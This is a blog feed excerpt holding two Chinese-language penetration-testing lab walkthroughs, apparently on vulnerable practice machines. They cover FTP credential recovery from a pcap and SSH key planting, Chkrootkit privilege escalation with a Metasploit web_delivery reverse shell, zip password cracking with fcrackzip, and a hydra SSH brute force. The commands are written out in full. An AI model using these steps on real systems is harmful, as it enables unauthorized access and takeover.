&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820151927536.png&#34; alt=&#34;image-20210820151927536&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;目录枚举&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#目录枚举&#34;&gt;#&lt;/a&gt; 目录枚举&lt;/h3&gt;
&lt;p&gt;利用 dirb 进行扫描目录&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dirb http://172.16.10.136 -X .php,.txt,.html,.xml,.yml,.json&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820152105295.png&#34; alt=&#34;image-20210820152105295&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现存在 abuse.txt，将其下载下来查看，得到一串奇怪字符&lt;strong&gt; nfubxn.cpncat&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820152153462.png&#34; alt=&#34;image-20210820152153462&#34;&gt;&lt;/p&gt;
&lt;p&gt;经过百度分析，发现这是一种 ROT13 的加密方式&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ROT13（回转13位）是一种简易的替换式密码算法。它是一种在英文网络论坛用作隐藏八卦、妙句、谜题解答以及某些脏话的工具，目的是逃过版主或管理员的匆匆一瞥。ROT13 也是过去在古罗马开发的凯撒密码的一种变体。ROT13是它自身的逆反，即：要还原成原文只要使用同一算法即可得，故同样的操作可用于加密与解密。该算法并没有提供真正密码学上的保全，故它不应该被用于需要保全的用途上。它常常被当作弱加密示例的典型。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;应用ROT13到一段文字上仅仅只需要检查字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开头即可。A换成N、B换成O、依此类推到M换成Z，然后串行反转：N换成A、O换成B、最后Z换成M。只有这些出现在英文字母里的字符受影响；数字、符号、空白字符以及所有其他字符都不变。替换后的字母大小写保持不变。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;N-A O-B P-C Q-D R-E S-F T-G U-H V-I W-J X-K Y-L Z-M&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;将其 rot13 进行解密得到 ashoka.pcapng，猜想浏览器存在&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820152640154.png&#34; alt=&#34;image-20210820152640154&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试浏览器访问，并下载下来，成功得到 ashoka.pcapng 数据包&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820153050614.png&#34; alt=&#34;image-20210820153050614&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;分析数据包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#分析数据包&#34;&gt;#&lt;/a&gt; 分析数据包&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wireshark ashoka.pcapng &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;分析数据包，发现存在大量FTP协议包，成功得到ftp用户和密码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820153306877.png&#34; alt=&#34;image-20210820153306877&#34;&gt;&lt;/p&gt;
&lt;p&gt;靶机开放了 21 端口，利用 FTP 成功连接，但发现并没有什么有用信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820153745039.png&#34; alt=&#34;image-20210820153745039&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;参考网上，SSH免密登录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;显示的内容像是在用户路径下的隐藏文件，该ftp的目录可能就是ashoka用户的目录。而且ftp运行新建文件夹和上传文件。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;所以可以设置SSH免密登录，将文件上传到.ssh的文件夹下。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;ftp渗透利用ssh免密登录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp渗透利用ssh免密登录&#34;&gt;#&lt;/a&gt; FTP 渗透（利用 SSH 免密登录）&lt;/h3&gt;
&lt;p&gt;首先在 kali 生成公钥和私钥&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen 生成&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat id_rsa.pub &amp;gt; authorized_keys  更改名字&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820154317504.png&#34; alt=&#34;image-20210820154317504&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用 FTP 将公钥进行上传到靶机上，成功上传&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;lcd /root/.ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mkdir .ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd .ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;put authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820155656817.png&#34; alt=&#34;image-20210820155656817&#34;&gt;&lt;/p&gt;
&lt;p&gt;下面直接利用 ssh 进行连接 ashoka（免密登录）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820155720343.png&#34; alt=&#34;image-20210820155720343&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;提权chkrootkit&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提权chkrootkit&#34;&gt;#&lt;/a&gt; 提权（Chkrootkit）&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;思路：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;我们得到了 ashoka 用户的权限。经过一些枚举，我们看到临时文件/tmp中有一个日志文件。我们尝试使用 cat 命令查看它。它绝对看起来像 Chkrootkit 测试结果日志,这是我们可以使用 Chkrootkit 在这台机器上提升权限的线索。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;提权一执行脚本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提权一执行脚本&#34;&gt;#&lt;/a&gt; 提权一（执行脚本）&lt;/h4&gt;
&lt;p&gt;发现可以利用本地 Chkrootkit 进行提权&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820155932366.png&#34; alt=&#34;image-20210820155932366&#34;&gt;&lt;/p&gt;
&lt;p&gt;进一步查看 Chkrootkit 权限&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;find / -name chkrootkit* 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd /usr/local/share/chkrootkit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./chkrootkit -V  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;发现此版本确实存在提权漏洞，Chkrootkit0.49以及以下版本均存在本地提权漏洞，只要提权上传一个文件到tmp目录，管理员再次运行Chkrootkit后，即可获取root权限&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820160200147.png&#34; alt=&#34;image-20210820160200147&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820160305476.png&#34; alt=&#34;image-20210820160305476&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以，在 kali 中新建一个 update.c 的文件，并写入下面的数据。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820160703494.png&#34; alt=&#34;image-20210820160703494&#34;&gt;&lt;/p&gt;
&lt;p&gt;将其上传到靶机上进行编译和执行&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd /tmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc update.c -o update&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./update&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820161039785.png&#34; alt=&#34;image-20210820161039785&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里我刚拷 update 进去不一会就变成 root 了，等 待一会运行./update&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820161130008.png&#34; alt=&#34;image-20210820161130008&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;提权二模块提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#提权二模块提权&#34;&gt;#&lt;/a&gt; 提权二（模块提权）&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;思路：用到两个模块，反弹模块和提权Chkrootkit模块&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/script/web_delivery&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/unix/local/chkrootkit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首先，利用反弹 shell 模块，为我们提供一个在目标机器上的 meterpreter。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;search web_de&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/script/web_delivery&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost 本地IP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport 监听端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set uripath 指定url&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit 生成&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820161733723.png&#34; alt=&#34;image-20210820161733723&#34;&gt;&lt;/p&gt;
&lt;p&gt;将生成的命令，复制到靶机进行粘贴，成功反弹 ashoka 用户的权限&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820161946891.png&#34; alt=&#34;image-20210820161946891&#34;&gt;&lt;/p&gt;
&lt;p&gt;下面进行提权模块利用，成功利用 Chkrootkit 模块提权 root&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;background&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;search chkrootkit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/unix/local/chkrootkit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set sessions 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210820162651032.png&#34; alt=&#34;image-20210820162651032&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/08/19/Gear_Of_War%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/</guid>
            <title>Gear_Of_War靶场笔记</title>
            <link>https://chungod.github.io/2021/08/19/Gear_Of_War%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/</link>
            <category>Gear_Of_War靶场笔记</category>
            <pubDate>Thu, 19 Aug 2021 21:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;gear_of_war靶场笔记&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gear_of_war靶场笔记&#34;&gt;#&lt;/a&gt; Gear_Of_War 靶场笔记&lt;/h2&gt;
&lt;h3 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h3&gt;
&lt;p&gt;先扫描靶机基本信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819151259588.png&#34; alt=&#34;image-20210819151259588&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现开放了 139 和 445 的 smb 端口，靶机系统为 Ubuntu&lt;/p&gt;
&lt;p&gt;继续探测 smb 服务&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;enum4linux -S IP&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819151554260.png&#34; alt=&#34;image-20210819151554260&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;发现靶机开启了该共享 //172.16.101.250/LOCUS_LAN$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;利用smbclient --user=share 共享名  进行连接（无密码）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819151819536.png&#34; alt=&#34;image-20210819151819536&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现两个文件 msg_horda.zip 和 SOS.txt，GET 下载进行分析&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819152044735.png&#34; alt=&#34;image-20210819152044735&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;字典生成&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#字典生成&#34;&gt;#&lt;/a&gt; 字典生成&lt;/h3&gt;
&lt;p&gt;发现奇怪字符 [@%%,]，在密码学 crunch 中具有特殊意义&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@ 代表小写字母，% 代表数字，, 代表大写字符， ^ 代表特殊符号&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;所以利用 crunch 工具进行密码生成&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;crunch 4 4 -t @%%, -o wordlist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819152422139.png&#34; alt=&#34;image-20210819152422139&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819152454714.png&#34; alt=&#34;image-20210819152454714&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;密码爆破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#密码爆破&#34;&gt;#&lt;/a&gt; 密码爆破&lt;/h3&gt;
&lt;p&gt;使用 fcrackzip 工具，配合第二题生成的字典文件进行密码爆破，获取到 msg_horda.zip 的密码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;命令：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fcrackzip -D -p wordlist -u msg_horda.zip&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819152649032.png&#34; alt=&#34;image-20210819152649032&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功破解得到 zip 密码 &lt;strong&gt;r44M&lt;/strong&gt;，利用密码解压 msg_horda.zip 得到&lt;strong&gt; key.txt&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819152845000.png&#34; alt=&#34;image-20210819152845000&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看 key.txt，得到了一串字符 3_d4y，又发现靶机开启了 22 端口，&lt;/p&gt;
&lt;p&gt;猜测可能是 ssh 服务的密码&lt;/p&gt;
&lt;h3 id=&#34;用户爆破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户爆破&#34;&gt;#&lt;/a&gt; 用户爆破&lt;/h3&gt;
&lt;p&gt;一、&lt;/p&gt;
&lt;p&gt;浏览靶机 web 端 robots.txt，猜测用户名生成字典&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819153202139.png&#34; alt=&#34;image-20210819153202139&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819153431092.png&#34; alt=&#34;image-20210819153431092&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用自身生成的用户字典和密码 3_d4y 爆破 SSH 服务，得到 SSH 服务用户名 marcus&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;hydra -L user.txt -p 3_d4y -t 64 ssh://172.16.101.250&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819153615140.png&#34; alt=&#34;image-20210819153615140&#34;&gt;&lt;/p&gt;
&lt;p&gt;二、&lt;/p&gt;
&lt;p&gt;使用 /usr/share/wordlists/rockyou.txt 作为用户名字典，结合得到的密码尝试爆破 ssh 服务&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819153715970.png&#34; alt=&#34;image-20210819153715970&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;先利用 zcat 进行解压gz文件，得到用户名字典&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;zcat rockyou.txt.gz &amp;gt;rockyou.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819153805810.png&#34; alt=&#34;image-20210819153805810&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用九头蛇进行爆破，由于字典太大，需要慢慢等待&lt;/p&gt;
